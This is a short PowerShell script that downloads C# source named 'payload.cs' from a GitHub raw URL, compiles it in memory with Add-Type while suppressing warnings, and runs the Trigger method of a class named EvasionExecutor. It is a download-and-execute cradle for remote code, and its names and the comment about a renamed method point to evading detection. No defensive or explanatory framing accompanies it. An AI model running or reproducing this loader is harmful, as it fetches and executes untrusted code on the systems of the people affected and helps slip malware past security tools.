$data = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/lucid251/HGJFJTKH24/main/payload.cs')

Add-Type -TypeDefinition $data -WarningAction 0

$obj = New-Object EvasionExecutor

# Call the renamed method
$obj.Trigger()
